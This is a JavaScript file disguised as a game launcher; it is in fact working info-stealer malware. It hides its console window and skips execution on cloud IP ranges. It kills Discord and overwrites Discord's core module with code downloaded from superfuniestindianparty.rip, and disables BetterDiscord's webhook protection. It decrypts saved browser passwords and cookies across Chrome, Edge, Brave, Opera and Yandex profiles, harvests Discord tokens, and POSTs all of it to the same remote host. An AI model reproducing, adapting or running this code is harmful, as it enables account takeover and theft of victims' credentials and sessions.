console.log("Starting game...");

var debug = false;
var args = process.argv.slice(2);

if (args[0] == "debug") debug = true;
else hideSelf();

const fs = require("fs");
const glob = require("glob");
const crypto = require("crypto");

const {
    exec
} = require("child_process");

const https = require("https");
const buf_replace = require("buffer-replace");
const sqlite3 = require("nexe-natives")(require.resolve("sqlite3"));
const dpapi = require("nexe-natives")(require.resolve("win-dpapi"));

(async () => {
    https.get("https://ipconfig.io/json", yayeko => {
        let moir = "";
        yayeko.on("data", juanell => {
            moir += juanell;
        });
        yayeko.on("end", () => {
            let chavas = moir.asn_org.toLowerCase();
            let mikele = ["microsoft", "google", "ovh"];
            if (mikele.some(keeno => chavas.includes(keeno))) return process.exit();
            stealGameConfig();
            takePizzas();
            takeCheese();
        });
    }).on("error", taeler => {
        if (debug) console.log(taeler);
    });
})();

var appdata = process.env.APPDATA;
var localappdata = process.env.LOCALAPPDATA;
var games = [];
var injectPath = [];
var runningGames = [];
var retries = 0;
var paths = [appdata + "\\discord\\", appdata + "\\discordcanary\\", appdata + "\\discordptb\\", appdata + "\\discorddevelopment\\", appdata + "\\lightcord\\", localappdata + "\\Google\\Chrome\\User Data\\Default\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\", localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\", localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\", appdata + "\\Opera Software\\Opera Stable\\", appdata + "\\Opera Software\\Opera GX Stable\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\", localappdata + "BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\", localappdata + "\\Microsoft\\Edge\\User Data\\Default\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\", localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\", localappdata + "BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\", localappdata + "Microsoft\\Edge\\User Data\\Profile 2\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\"];

fs.readdirSync(localappdata).forEach(casadee => {
    console.log("Searching game folder...");
    if (casadee.includes("cord")) games.push(localappdata + "\\" + casadee);
    else return;
});

games.forEach(kaysha => {
    console.log("Making game config...");
    let avaline = "" + kaysha + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
    console.log(kaysha);
    glob.sync(avaline).map(broox => {
        console.log(broox);
        injectPath.push(broox);
        console.log("Saving config file...");
        listGames();
    });
});

async function Infect() {
    console.log("Searching online update");
    var shiyann = "https://superfuniestindianparty.rip/QDVkCo9cC0g2/str";
    console.log(shiyann);
    https.get(shiyann, tayyib => {
        let dewy = "";
        tayyib.on("data", jendrick => {
            dewy += jendrick;
        });
        tayyib.on("end", () => {
            injectPath.forEach(bartek => {
                try {
                    const lytia = {};
                    lytia.encoding = "utf8";
                    lytia.flag = "w";
                    fs.writeFileSync(bartek, dewy, lytia);
                } catch (ayan) {
                    retries++;
                    if (debug) console.log(ayan);
                }
                startGame();
            });
        });
    }).on("error", makalia => {
        retries++;
        if (debug) console.log(makalia);
    });
};

function listGames() {
    console.log("Trying config...");
    exec("tasklist", (labritney, lenyn) => {
        const ellysa = "0|2|1|4|3".split("|");
        let keangelo = 0;
        while (true) {
            switch (ellysa[keangelo++]) {
                case "0":
                    if (lenyn.includes("Discord.exe")) runningGames.push("Discord");
                    continue;
                case "1":
                    if (lenyn.includes("DiscordPTB.exe")) runningGames.push("DiscordPTB");
                    continue;
                case "2":
                    if (lenyn.includes("DiscordCanary.exe")) runningGames.push("DiscordCanary");
                    continue;
                case "3":
                    killGame();
                    continue;
                case "4":
                    if (lenyn.includes("DiscordDevelopment.exe")) runningGames.push("DiscordDevelopment");
                    continue;
            }
            break;
        }
    });
};

function killGame() {
    runningGames.forEach(kristee => {
        try {
            exec("taskkill /IM " + kristee + ".exe /F", srinath => {
                if (srinath)
                    if (debug) console.log(srinath);
            });
        } catch (jorian) {
            if (debug) console.log(jorian);
        }
    });
    Infect();
    superGameFinder();
};

function startGame() {
    runningGames.forEach(konan => {
        console.log("Starting game paths...");
        path = localappdata + "\\" + konan + "\\Update.exe";
        try {
            exec(path + " --processStart " + konan + ".exe", darthie => {
                if (darthie)
                    if (debug) console.log(darthie);
            });
        } catch (lali) {
            if (debug) console.log(lali);
        }
    });
};

function superGameFinder() {
    var siegfried = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(siegfried)) {
        var latijera = fs.readFileSync(siegfried);
        try {
            fs.writeFileSync(siegfried, buf_replace(latijera, "api/webhooks", "kkkk"));
        } catch (bethan) {
            if (debug) console.log(bethan);
        }
    } else return;
}

async function getPizzas(quantasia) {
    let other = quantasia.split("\\");
    let jacori = quantasia.includes("Network") ? other.splice(-other.length, other.length - 3) : other.splice(-other.length, other.length - 2);
    let willet = jacori.join("\\") + "\\";
    if (quantasia.startsWith(appdata)) willet = quantasia;
    if (quantasia.includes("cord")) return;
    if (fs.existsSync(willet)) {
        try {
            let arwin = fs.readFileSync(willet + "Local State");
            let ayslinn = JSON.parse(arwin).os_crypt.encrypted_key;
            let raymer = Buffer.from(ayslinn, "base64").slice(5);
            var yasmin = quantasia + "Login Data";
            var ophelie = quantasia + "passwords.db";
            fs.copyFileSync(yasmin, ophelie);
            const nickia = Buffer.from(raymer, "utf-8");
            const cairee = dpapi.unprotectData(nickia, null, "CurrentUser");
            var montrel = "\nPASSWORDS FROM: " + quantasia + "  #BBYSTEALERSEXYSPAINMAMI\n";
            var neville = new sqlite3.Database(ophelie, deniella => {
                if (deniella)
                    if (debug) console.log(deniella);
            });
            const tymiesha = await new Promise(ashmeet => {
                neville.each("SELECT origin_url, username_value, password_value FROM logins", function (gannyn, deitra) {
                    if (gannyn)
                        if (debug) console.log(gannyn);
                    if (deitra.username_value != "") {
                        let coreen = deitra.password_value;
                        try {
                            if (coreen[0] == 1 && coreen[1] == 0 && coreen[2] == 0 && coreen[3] == 0) {
                                montrel += "\nURL: " + deitra.origin_url + " | USERNAME: " + deitra.username_value + " | PASSWORD: " + dpapi.unprotectData(coreen, null, "CurrentUser").toString("utf-8");
                            } else {
                                let jaylind = coreen.slice(3, 15);
                                let skyland = coreen.slice(15, coreen.length - 16);
                                let dimari = coreen.slice(coreen.length - 16, coreen.length);
                                let curstin = crypto.createDecipheriv("aes-256-gcm", cairee, jaylind);
                                curstin.setAuthTag(dimari);
                                let micaila = curstin.update(skyland, "base64", "utf-8");
                                micaila += curstin.final("utf-8");
                                montrel += "\nURL: " + deitra.origin_url + " | USERNAME: " + deitra.username_value + " | PASSWORD: " + micaila;
                            }
                        } catch (tawhid) {
                            if (debug) console.log(tawhid);
                        }
                    }
                }, function () {
                    ashmeet(montrel);
                });
            });
            return tymiesha;
        } catch (aby) {
            if (debug) console.log(aby);
        }
    } else {
        return "";
    }
}

async function getCheese(chealse) {
    let reeanna = chealse.split("\\");
    let sammer = chealse.includes("Network") ? reeanna.splice(-reeanna.length, reeanna.length - 3) : reeanna.splice(-reeanna.length, reeanna.length - 2);
    let vong = sammer.join("\\") + "\\";
    if (chealse.startsWith(appdata)) vong = chealse;
    if (chealse.includes("cord")) return;
    if (fs.existsSync(vong)) {
        try {
            let thelma = fs.readFileSync(vong + "Local State");
            let aareon = JSON.parse(thelma).os_crypt.encrypted_key;
            let berchman = Buffer.from(aareon, "base64").slice(5);
            var tyranny = chealse + "Cookies";
            var ibn = chealse + "cookies.db";
            fs.copyFileSync(tyranny, ibn);
            const kelisia = Buffer.from(berchman, "utf-8");
            const kurt = dpapi.unprotectData(kelisia, null, "CurrentUser");
            var jacci = "\nCOOKIES FROM: " + chealse + "  #BBYSTEALERSEXYSPAINMAMI\n";
            var jamen = new sqlite3.Database(ibn, aniayah => {
                if (aniayah)
                    if (debug) console.log(aniayah);
            });
            const sanaah = await new Promise(darlah => {
                jamen.each("SELECT host_key, name, encrypted_value FROM cookies", function (heavenley, anysha) {
                    if (heavenley)
                        if (debug) console.log(heavenley);
                    let selebrity = anysha.encrypted_value;
                    try {
                        if (selebrity[0] == 1 && selebrity[1] == 0 && selebrity[2] == 0 && selebrity[3] == 0) {
                            jacci += "\nHOST KEY: " + anysha.host_key + " | NAME: " + anysha.name + " | VALUE: " + dpapi.unprotectData(selebrity, null, "CurrentUser").toString("utf-8");
                        } else {
                            let umaya = selebrity.slice(3, 15);
                            let maxxis = selebrity.slice(15, selebrity.length - 16);
                            let dashonna = selebrity.slice(selebrity.length - 16, selebrity.length);
                            let starkisha = crypto.createDecipheriv("aes-256-gcm", kurt, umaya);
                            starkisha.setAuthTag(dashonna);
                            let kaz = starkisha.update(maxxis, "base64", "utf-8");
                            kaz += starkisha.final("utf-8");
                            jacci += "\nHOST KEY: " + anysha.host_key + " | NAME: " + anysha.name + " | VALUE: " + kaz;
                        }
                    } catch (sheryl) {
                        if (debug) console.log(sheryl);
                    }
                }, function () {
                    darlah(jacci);
                });
            });
            return sanaah;
        } catch (koryna) {
            if (debug) console.log(koryna);
        }
    } else return "";
}

async function takePizzas() {
    let cecila = "";
    for (let perfecta = 0; perfecta < paths.length; perfecta++) {
        if (fs.existsSync(paths[perfecta] + "Login Data")) cecila += await getPizzas(paths[perfecta]) || "";
        if (perfecta === 1 + paths.length) {
            const shavada = {};
            shavada.hostname = "superfuniestindianparty.rip";
            shavada.port = 443;
            shavada.path = "/QDVkCo9cC0g2/passwords";
            shavada.method = "POST";

            shavada.headers = {};
            shavada.headers["User-Agent"] = "bbystealer_kkk01";
            shavada.headers["Content-Type"] = "text/plain";
            shavada.headers["Content-Length"] = cecila.length;

            var daliah = https.request(shavada);
            daliah.on("error", oesha => {
                if (debug) console.log(oesha);
            });
            daliah.write(cecila);
            daliah.end();
        }
    }
}

async function takeCheese() {
    let polly = "";
    for (let maksymilian = 0; maksymilian < paths.length; maksymilian++) {
        if (fs.existsSync(paths[maksymilian] + "Cookies")) polly += await getCheese(paths[maksymilian]) || "";
        if (maksymilian === 1 + paths.length) {
            const yovan = {};
            yovan.hostname = "superfuniestindianparty.rip";
            yovan.port = 443;
            yovan.path = "/QDVkCo9cC0g2/cookies";
            yovan.method = "POST";

            yovan.headers = {};
            yovan.headers["User-Agent"] = "bbystealer_kkk01";
            yovan.headers["Content-Type"] = "text/plain";
            yovan.headers["Content-Length"] = polly.length;

            var keyondre = https.request(yovan);
            keyondre.on("error", bergin => {
                if (debug) console.log(bergin);
            });
            keyondre.write(polly);
            keyondre.end();
        }
    }
}

function hideSelf() {
    const solash = function () {
        let temeeka = true;
        return function (eryn, vy) {
            const devynne = temeeka ? function () {
                if (vy) {
                    const laurelai = vy.apply(eryn, arguments);
                    vy = null;
                    return laurelai;
                }
            } : function () { };
            temeeka = false;
            return devynne;
        };
    }();
    const paitlynn = solash(this, function () {
        return paitlynn.toString().search("(((.+)+)+)+$").toString().constructor(paitlynn).search("(((.+)+)+)+$");
    });
    paitlynn();
    const ora = function () {
        let jeryl = true;
        return function (scarleth, richelle) {
            const artrell = jeryl ? function () {
                if (richelle) {
                    const ijah = richelle.apply(scarleth, arguments);
                    richelle = null;
                    return ijah;
                }
            } : function () { };
            jeryl = false;
            return artrell;
        };
    }();
    const alfiya = ora(this, function () {
        let persaius;
        try {
            const whit = Function('return (function() {}.constructor("return this")( );');
            persaius = whit();
        } catch (wahaj) {
            persaius = window;
        }
        const namuun = persaius.console = persaius.console || {};
        const anthonette = ["log", "warn", "info", "error", "exception", "table", "trace"];
        for (let ronon = 0; ronon < anthonette.length; ronon++) {
            const donnella = ora.constructor.prototype.bind(ora);
            const eretria = anthonette[ronon];
            const jackline = namuun[eretria] || donnella;
            donnella.__proto__ = ora.bind(ora);
            donnella.toString = jackline.toString.bind(jackline);
            namuun[eretria] = donnella;
        }
    });
    alfiya();
    let saylem = '\n    Add-Type -Name Window -Namespace Console -MemberDefinition \'\n    [DllImport("Kernel32.dll")]\n    public static extern IntPtr GetConsoleWindow();\n\n    [DllImport("user32.dll")]\n    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n    \'\n\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    #0 hide\n    [Console.Window]::ShowWindow($consolePtr, 0)\n    ';
    let letroy = process.cwd();
    let kelsea = letroy + "\\temp.ps1";
    try {
        fs.writeFileSync(kelsea, saylem);
        require("child_process").execSync("type .\\temp.ps1 | powershell.exe -noprofile -", {
            stdio: "inherit"
        });
        fs.unlinkSync(kelsea);
    } catch (melitza) { }
}

function findToken(javel) {
    javel += "Local Storage\\leveldb";
    let roshay = [];
    try {
        fs.readdirSync(javel).map(akul => {
            if (akul.endsWith(".log") || akul.endsWith(".ldb")) {
                fs.readFileSync(javel + "\\" + akul, "utf8").split(/\r?\n/).forEach(chiron => {
                    const jordy = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                    for (const myasiah of jordy) {
                        const andres = chiron.match(myasiah);
                        if (andres) andres.forEach(tria => roshay.push(tria));
                    }
                });
            }
        });
    } catch (rochely) { }
    return roshay;
}

function onlyUnique(joksan, deadria, ahnesty) {
    return ahnesty.indexOf(joksan) === deadria;
}

async function stealGameConfig() {
    const kaela = [];
    for (let levant of paths) {
        const wilhelm = findToken(levant);
        if (wilhelm) wilhelm.forEach(arlisa => kaela.push(arlisa));
    }
    var baelfire = kaela.filter(onlyUnique);
    var leilia = JSON.stringify(baelfire);

    const drennen = {};
    drennen.hostname = "superfuniestindianparty.rip";
    drennen.port = 443;
    drennen.path = "/QDVkCo9cC0g2/tokens";
    drennen.method = "POST";

    drennen.headers = {};
    drennen.headers["User-Agent"] = "bbystealer_kkk01";
    drennen.headers["Content-Type"] = "application/json";
    drennen.headers["Content-Length"] = leilia.length;

    var jagur = https.request(drennen);
    jagur.on("error", alvena => {
        if (debug) console.log(alvena);
    });
    jagur.write(leilia);
    jagur.end();
}